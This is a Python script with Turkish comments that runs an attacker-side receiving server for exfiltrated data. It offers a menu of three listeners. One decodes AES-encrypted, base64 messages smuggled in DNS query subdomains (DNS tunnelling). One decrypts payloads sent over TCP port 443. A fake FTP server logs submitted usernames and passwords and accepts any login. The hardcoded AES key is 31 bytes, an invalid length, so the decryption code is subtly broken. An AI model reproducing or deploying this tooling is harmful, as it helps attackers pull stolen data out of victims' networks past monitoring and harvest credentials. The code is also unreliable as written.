import socket
import threading
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

key = b'sifre123sifre123sifre123sifre12'
iv = b'\x00' * 16

def decrypt_message(enc_msg):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted = unpad(cipher.decrypt(enc_msg), AES.block_size)
    return decrypted.decode()

def parse_dns_query(data):
    i = 12
    domain_parts = []
    length = data[i]
    while length != 0:
        i += 1
        domain_parts.append(data[i:i+length].decode('utf-8'))
        i += length
        length = data[i]
    domain = '.'.join(domain_parts)
    return domain

def dns_listener(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.bind((ip, port))
    print(f"DNS listener {ip}:{port} (UDP) çalışıyor...")
    while True:
        data, addr = s.recvfrom(512)
        try:
            domain = parse_dns_query(data)
            base64_data = domain.split('.')[0]
            enc_msg = base64.b64decode(base64_data)
            mesaj = decrypt_message(enc_msg)
            print(f"[DNS] {addr} → {mesaj}")
        except Exception as e:
            print(f"[DNS] Hata: {e}")

def tcp_listener(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((ip, port))
    s.listen(5)
    print(f"TCP listener {ip}:{port} (TCP) çalışıyor...")
    while True:
        conn, addr = s.accept()
        print(f"[TCP] Bağlantı: {addr}")
        data = b''
        try:
            while True:
                part = conn.recv(1024)
                if not part:
                    break
                data += part
            enc_msg = base64.b64decode(data)
            mesaj = decrypt_message(enc_msg)
            print(f"[TCP] {addr} → {mesaj}")
        except Exception as e:
            print(f"[TCP] Hata: {e}")
        finally:
            conn.close()

def ftp_listener(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((ip, port))
    s.listen(5)
    print(f"FTP listener {ip}:{port} (TCP) çalışıyor...")
    while True:
        conn, addr = s.accept()
        print(f"[FTP] Bağlantı: {addr}")
        try:
            conn.send(b"220 FTP Sunucusu Hazır\r\n")
            while True:
                data = conn.recv(1024)
                if not data:
                    break
                print(f"[FTP] {addr} → {data.decode(errors='ignore').strip()}")
                # Burada FTP komutlarını işle veya client verisini yakala
                # Örneğin USER, PASS komutlarını kontrol edebilirsin
                # Basit cevap verelim:
                if data.upper().startswith(b"USER"):
                    conn.send(b"331 Kullanıcı adı alındı, parola iste\r\n")
                elif data.upper().startswith(b"PASS"):
                    conn.send(b"230 Kullanıcı giriş yaptı\r\n")
                else:
                    conn.send(b"200 Komut tamamlandı\r\n")
        except Exception as e:
            print(f"[FTP] Hata: {e}")
        finally:
            conn.close()

def menu():
    print("Bağlantı türünü seç:")
    print("1 - DNS (UDP 53)")
    print("2 - TCP (443)")
    print("3 - FTP (TCP 21)")
    secim = input("Seçiminiz (1-3): ")
    return secim

def main():
    secim = menu()
    ip = "0.0.0.0"
    if secim == '1':
        dns_listener(ip, 53)
    elif secim == '2':
        tcp_listener(ip, 443)
    elif secim == '3':
        ftp_listener(ip, 21)
    else:
        print("Geçersiz seçim!")

if __name__ == "__main__":
    main()
